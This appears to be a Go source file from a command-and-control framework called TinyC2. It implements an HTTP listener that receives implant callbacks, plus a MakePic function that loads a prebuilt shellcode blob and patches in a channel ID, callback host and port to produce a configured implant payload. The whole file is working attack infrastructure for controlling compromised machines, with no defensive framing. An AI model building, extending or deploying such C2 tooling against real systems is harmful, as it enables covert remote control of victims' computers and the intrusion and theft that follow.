package listener

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"os"
	"time"

	"github.com/0xPrimo/TinyC2/sdk"

	"github.com/gin-gonic/gin"
	"github.com/goccy/go-yaml"
)

type HttpListener struct {
	Name   string
	Engine sdk.IEngine
	Server *http.Server
	Config HttpConfig
}

type HttpConfig struct {
	ConnHost string `yaml:"connhost"`
	ConnPort uint16 `yaml:"connport"`
	BindHost string `yaml:"bindhost"`
	BindPort uint16 `yaml:"bindport"`
}

func NewHttpListener(engine sdk.IEngine, name string, config string) (sdk.IListener, error) {
	data, err := os.ReadFile(config)
	if err != nil {
		return nil, err
	}

	var cfg HttpConfig
	if err := yaml.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}

	return &HttpListener{
		Name:   name,
		Engine: engine,
		Config: cfg,
	}, nil
}

func (h *HttpListener) Start() error {
	addr := fmt.Sprintf("%s:%d", h.Config.BindHost, h.Config.BindPort)
	err := IsValidAddress(addr)
	if err != nil {
		return fmt.Errorf("listener start: %v", err)
	}

	gin.SetMode(gin.ReleaseMode)

	r := gin.New()
	r.POST("/", CreateHttpHandler(h))

	h.Server = &http.Server{
		Addr:    addr,
		Handler: r,
	}

	go func() {
		if err := h.Server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			h.Engine.LogError(h.Name, "listen and serve error: %v", err)
		}
	}()

	return nil
}

func (h *HttpListener) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := h.Server.Shutdown(ctx); err != nil {
		h.Engine.LogWarning(h.Name, "listener forced to shutdown: %v", err)
	}

	return nil
}

func (h *HttpListener) MakePic(id uint32) ([]byte, error) {
	// read plugin pic
	data, err := os.ReadFile("plugins/http/bin/channel.x64.pic")
	if err != nil {
		return nil, fmt.Errorf("failed to read pic: %w", err)
	}

	// patch channel id
	offset := bytes.Index(data, []byte("LSID"))
	if offset == -1 {
		return nil, fmt.Errorf("string 'LSID' not found in pic")
	}
	binary.LittleEndian.PutUint32(data[offset:offset+4], id)

	// patch host
	offset = bytes.Index(data, []byte("123.123.123.123"))
	if offset == -1 {
		return nil, fmt.Errorf("string '123.123.123.123' not found in pic")
	}
	copy(data[offset:offset+len(h.Config.ConnHost)], []byte(h.Config.ConnHost))
	data[offset+len(h.Config.ConnHost)] = 0

	// patch port
	offset = bytes.Index(data, []byte("PORT"))
	if offset == -1 {
		return nil, fmt.Errorf("string 'PORT' not found in pic")
	}
	binary.LittleEndian.PutUint16(data[offset:offset+2], h.Config.ConnPort)

	// return pic
	return data, nil
}

func IsValidAddress(address string) error {
	listener, err := net.Listen("tcp", address)
	if err != nil {
		return err
	}

	_ = listener.Close()
	return nil
}
